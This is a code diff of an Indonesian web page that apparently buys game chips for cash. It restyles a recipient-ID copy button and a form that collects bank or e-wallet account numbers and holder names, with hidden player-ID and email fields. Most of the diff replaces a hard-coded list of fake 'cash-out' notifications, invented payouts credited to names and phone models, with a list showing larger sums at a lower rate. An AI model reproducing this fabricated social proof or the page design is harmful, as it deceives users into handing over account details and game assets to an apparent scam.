@@ -28,6 +28,20 @@ body {
   margin: 0
 }
 
+/* tombol copy */
+.copyable { gap: 8px; }
+.copy-btn{
+  background: linear-gradient(45deg,#ff9800,#ffcc33);
+  border: none;
+  border-radius: 10px;
+  padding: 6px 12px;
+  font-weight: 700;
+  cursor: pointer;
+  box-shadow: 0 4px 10px rgba(0,0,0,.25);
+}
+.copy-btn:hover{ transform: scale(1.05); }
+	  
+
 /* === PRETTY SELECT (BANK) === */
 .pretty-input select {
   border: none;
@@ -647,12 +661,11 @@ body {
                             <figure class="sliderbanner" style="display: block;"> 
                               <img src="img/id.png" alt="Image" height="200" width="200">
                             </figure> 
-                            <div class="itemkontol">
-                              <label>❖</label> 
-                              <body>
-                                <input type="text" value="1971004" id="myInput" name="id_penerima_koin" readonly>
-                                <button type="button" onclick="myFunction()">Copy</button>
-
+                            <div class="pretty-input copyable">
+  <span class="pretty-icon">🆔</span>
+  <input type="text" id="idPenerima" value="1971004" readonly>
+  <button type="button" class="copy-btn" onclick="copyID()">Copy</button>
+</div>
                                 <script>
                                   function myFunction() {
                                     var copyText = document.getElementById("myInput");
@@ -697,14 +710,14 @@ body {
     <option>GOPAY</option>
   </select>
 </div>
-                                        <div class="itemkontol"> 
-                                          <label>5.</label> 
-                                          <input type="number" name="nomor_rekening" placeholder="Nomor Rekening Pencai" required> 
-                                        </div> 
-                                        <div class="itemkontol"> 
-                                          <label>6.</label> 
-                                          <input type="text" name="atas_nama" placeholder="Atas Nama" required> 
-                                        </div> 
+                                        <div class="pretty-input">
+  <span class="pretty-icon">💳</span>
+  <input type="number" name="nomor_rekening" placeholder="Nomor Rekening" required>
+</div>
+                                       <div class="pretty-input">
+  <span class="pretty-icon">👤</span>
+  <input type="text" name="atas_nama" placeholder="Atas Nama" required>
+</div>
                                         <div class="buttonnwgverifhdi"> 
                                           <input type="hidden" name="playid" id="ressplayid" value="" readonly>
                                           <input type="hidden" name="email" id="ressemail" value="" readonly>
@@ -785,74 +798,56 @@ document.getElementById("bongkarForm").addEventListener("submit", async function
 });
 document.addEventListener('DOMContentLoaded', () => {
             const notifications = [
-  { title: 'Walleye', message: 'Bongkar 20B | Rp. 1.260.000.' },
-  { title: 'Siti Aisyah', message: 'Bongkar 5B | Rp. 315.000.' },
-  { title: 'Infinix', message: 'Bongkar 4B | Rp. 252.000.' },
-  { title: 'Agung Rahman', message: 'Bongkar 7B | Rp. 441.000.' },
-  { title: 'RMX 1020', message: 'Bongkar 11B | Rp. 693.000.' },
-  { title: 'Poco X3 pro', message: 'Bongkar 13B | Rp. 819.000.' },
-  { title: 'Agus Rahman', message: 'Bongkar 2B | Rp. 126.000.' },
-  { title: 'Rdho 18', message: 'Bongkar 28B | Rp. 1.764.000.' },
-  { title: 'Infinix pro', message: 'Bongkar 5B | Rp. 315.000.' },
-  { title: 'Agus Junaidi', message: 'Bongkar 55B | Rp. 3.465.000.' },
-  { title: 'Randi Purnama', message: 'Bongkar 8B | Rp. 504.000.' },
-  { title: 'Iphone', message: 'Bongkar 8B | Rp. 504.000.' },
-  { title: 'RMX 8090', message: 'Bongkar 30B | Rp. 1.890.000.' },
-  { title: 'Siti Aisyah', message: 'Bongkar 6B | Rp. 378.000.' },
-  { title: 'Agung Rahman', message: 'Bongkar 3B | Rp. 189.000.' },
-  { title: 'Poco X3 pro', message: 'Bongkar 16B | Rp. 1.008.000.' },
-  { title: 'Infinix', message: 'Bongkar 2B | Rp. 126.000.' },
-  { title: 'Walleye', message: 'Bongkar 30B | Rp. 1.890.000.' },
-  { title: 'RMX 7090', message: 'Bongkar 12B | Rp. 756.000.' },
-  { title: 'Rido Putra', message: 'Bongkar 12B | Rp. 756.000.' },
-  { title: 'Agus Rahman', message: 'Bongkar 4B | Rp. 252.000.' },
-  { title: 'Infinix pro', message: 'Bongkar 3B | Rp. 189.000.' },
-  { title: 'Agung Rahman', message: 'Bongkar 5B | Rp. 315.000.' },
-  { title: 'Siti Aisyah', message: 'Bongkar 7B | Rp. 441.000.' },
-  { title: 'Randi Purnama', message: 'Bongkar 10B | Rp. 630.000.' },
-  { title: 'Walleye', message: 'Bongkar 1B | Rp. 63.000.' },
-  { title: 'RMX 1020', message: 'Bongkar 10B | Rp. 630.000.' },
-  { title: 'Agus Junaidi', message: 'Bongkar 45B | Rp. 2.835.000.' },
-  { title: 'Poco X3 pro', message: 'Bongkar 15B | Rp. 945.000.' },
-  { title: 'Infinix', message: 'Bongkar 4B | Rp. 252.000.' },
-  { title: 'Randi Purnama', message: 'Bongkar 9B | Rp. 567.000.' },
-  { title: 'Walleye', message: 'Bongkar 35B | Rp. 2.205.000.' },
-  { title: 'RMX 8090', message: 'Bongkar 20B | Rp. 1.260.000.' },
-  { title: 'Agus Rahman', message: 'Bongkar 3B | Rp. 189.000.' },
-  { title: 'Siti Aisyah', message: 'Bongkar 6B | Rp. 378.000.' },
-  { title: 'Rdho 18', message: 'Bongkar 25B | Rp. 1.575.000.' },
-  { title: 'Agus Junaidi', message: 'Bongkar 50B | Rp. 3.150.000.' },
-  { title: 'Infinix pro', message: 'Bongkar 2B | Rp. 126.000.' },
-  { title: 'RMX 1020', message: 'Bongkar 12B | Rp. 756.000.' },
-  { title: 'Randi Purnama', message: 'Bongkar 8B | Rp. 504.000.' },
-  { title: 'Walleye', message: 'Bongkar 40B | Rp. 2.520.000.' },
-  { title: 'Agung Rahman', message: 'Bongkar 5B | Rp. 315.000.' },
-  { title: 'Infinix', message: 'Bongkar 3B | Rp. 189.000.' },
-  { title: 'Poco X3 pro', message: 'Bongkar 14B | Rp. 882.000.' },
-  { title: 'Siti Aisyah', message: 'Bongkar 7B | Rp. 441.000.' },
-  { title: 'RMX 7090', message: 'Bongkar 11B | Rp. 693.000.' },
-  { title: 'Rido Putra', message: 'Bongkar 10B | Rp. 630.000.' },
-  { title: 'Agus Junaidi', message: 'Bongkar 55B | Rp. 3.465.000.' },
-  { title: 'Infinix pro', message: 'Bongkar 3B | Rp. 189.000.' },
-  { title: 'Walleye', message: 'Bongkar 2B | Rp. 126.000.' },
-  { title: 'Agung Rahman', message: 'Bongkar 5B | Rp. 315.000.' },
-  { title: 'Poco X3 pro', message: 'Bongkar 15B | Rp. 945.000.' },
-  { title: 'Infinix', message: 'Bongkar 4B | Rp. 252.000.' },
-  { title: 'Agus Rahman', message: 'Bongkar 2B | Rp. 126.000.' },
-  { title: 'RMX 1020', message: 'Bongkar 10B | Rp. 630.000.' },
-  { title: 'Walleye', message: 'Bongkar 30B | Rp. 1.890.000.' },
-  { title: 'Siti Aisyah', message: 'Bongkar 6B | Rp. 378.000.' },
-  { title: 'Iphone', message: 'Bongkar 6B | Rp. 378.000.' },
-  { title: 'Agung Rahman', message: 'Bongkar 5B | Rp. 315.000.' },
-  { title: 'Randi Purnama', message: 'Bongkar 10B | Rp. 630.000.' },
-  { title: 'Infinix pro', message: 'Bongkar 5B | Rp. 315.000.' },
-  { title: 'Agus Rahman', message: 'Bongkar 2B | Rp. 126.000.' },
-  { title: 'Siti Aisyah', message: 'Bongkar 7B | Rp. 441.000.' },
-  { title: 'RMX 8090', message: 'Bongkar 25B | Rp. 1.575.000.' },
-  { title: 'Walleye', message: 'Bongkar 1B | Rp. 63.000.' },
-  { title: 'Poco X3 pro', message: 'Bongkar 13B | Rp. 819.000.' },
-  { title: 'Agus Junaidi', message: 'Bongkar 60B | Rp. 3.780.000.' },
-  { title: 'Infinix', message: 'Bongkar 4B | Rp. 252.000.' },
+  { title: 'Poco X3 pro', message: 'Bongkar 14B | Rp. 868.000.' },
+  { title: 'Siti Aisyah', message: 'Bongkar 7B | Rp. 434.000.' },
+  { title: 'RMX 7090', message: 'Bongkar 11B | Rp. 682.000.' },
+  { title: 'Rido Putra', message: 'Bongkar 10B | Rp. 620.000.' },
+  { title: 'Agus Junaidi', message: 'Bongkar 55B | Rp. 3.410.000.' },
+  { title: 'Infinix pro', message: 'Bongkar 50B | Rp. 3.100.000.' },
+  { title: 'Walleye', message: 'Bongkar 5B | Rp. 310.000.' },
+  { title: 'Agung Rahman', message: 'Bongkar 50B | Rp. 3.100.000.' },
+  { title: 'Poco X3 pro', message: 'Bongkar 15B | Rp. 930.000.' },
+  { title: 'Infinix', message: 'Bongkar 5B | Rp. 310.000.' },
+  { title: 'Agus Rahman', message: 'Bongkar 5B | Rp. 310.000.' },
+  { title: 'RMX 1020', message: 'Bongkar 100B | Rp. 6.200.000.' },
+  { title: 'Walleye', message: 'Bongkar 30B | Rp. 1.860.000.' },
+  { title: 'Siti Aisyah', message: 'Bongkar 200B | Rp. 12.400.000.' },
+  { title: 'Iphone', message: 'Bongkar 6B | Rp. 372.000.' },
+  { title: 'Agung Rahman', message: 'Bongkar 100B | Rp. 6.200.000.' },
+  { title: 'Randi Purnama', message: 'Bongkar 10B | Rp. 620.000.' },
+  { title: 'Infinix pro', message: 'Bongkar 5B | Rp. 310.000.' },
+  { title: 'Agus Rahman', message: 'Bongkar 2B | Rp. 124.000.' },
+  { title: 'Siti Aisyah', message: 'Bongkar 7B | Rp. 434.000.' },
+  { title: 'RMX 8090', message: 'Bongkar 25B | Rp. 1.550.000.' },
+  { title: 'Walleye', message: 'Bongkar 1B | Rp. 62.000.' },
+  { title: 'Poco X3 pro', message: 'Bongkar 13B | Rp. 806.000.' },
+  { title: 'Agus Junaidi', message: 'Bongkar 60B | Rp. 3.720.000.' },
+  { title: 'Infinix', message: 'Bongkar 4B | Rp. 248.000.' },
+  { title: 'Poco X3 pro', message: 'Bongkar 14B | Rp. 868.000.' },
+  { title: 'Siti Aisyah', message: 'Bongkar 7B | Rp. 434.000.' },
+  { title: 'RMX 7090', message: 'Bongkar 11B | Rp. 682.000.' },
+  { title: 'Rido Putra', message: 'Bongkar 10B | Rp. 620.000.' },
+  { title: 'Agus Junaidi', message: 'Bongkar 55B | Rp. 3.410.000.' },
+  { title: 'Infinix pro', message: 'Bongkar 50B | Rp. 3.100.000.' },
+  { title: 'Walleye', message: 'Bongkar 5B | Rp. 310.000.' },
+  { title: 'Agung Rahman', message: 'Bongkar 50B | Rp. 3.100.000.' },
+  { title: 'Poco X3 pro', message: 'Bongkar 15B | Rp. 930.000.' },
+  { title: 'Infinix', message: 'Bongkar 5B | Rp. 310.000.' },
+  { title: 'Agus Rahman', message: 'Bongkar 5B | Rp. 310.000.' },
+  { title: 'RMX 1020', message: 'Bongkar 100B | Rp. 6.200.000.' },
+  { title: 'Walleye', message: 'Bongkar 30B | Rp. 1.860.000.' },
+  { title: 'Siti Aisyah', message: 'Bongkar 200B | Rp. 12.400.000.' },
+  { title: 'Iphone', message: 'Bongkar 6B | Rp. 372.000.' },
+  { title: 'Agung Rahman', message: 'Bongkar 100B | Rp. 6.200.000.' },
+  { title: 'Randi Purnama', message: 'Bongkar 10B | Rp. 620.000.' },
+  { title: 'Infinix pro', message: 'Bongkar 5B | Rp. 310.000.' },
+  { title: 'Agus Rahman', message: 'Bongkar 2B | Rp. 124.000.' },
+  { title: 'Siti Aisyah', message: 'Bongkar 7B | Rp. 434.000.' },
+  { title: 'RMX 8090', message: 'Bongkar 25B | Rp. 1.550.000.' },
+  { title: 'Walleye', message: 'Bongkar 1B | Rp. 62.000.' },
+  { title: 'Poco X3 pro', message: 'Bongkar 13B | Rp. 806.000.' },
+  { title: 'Agus Junaidi', message: 'Bongkar 60B | Rp. 3.720.000.' },
+  { title: 'Infinix', message: 'Bongkar 4B | Rp. 248.000.' },
       ];
 
             const container = document.getElementById('notifications-container');
@@ -900,6 +895,13 @@ document.addEventListener('DOMContentLoaded', () => {
 
             showNotifications();
         });
+
+function copyID(){
+  const el = document.getElementById('idPenerima');
+  el.select(); el.setSelectionRange(0,99999);
+  navigator.clipboard.writeText(el.value);
+  alert('COPY: ' + el.value);
+}
 </script>
  </body>
 </html>
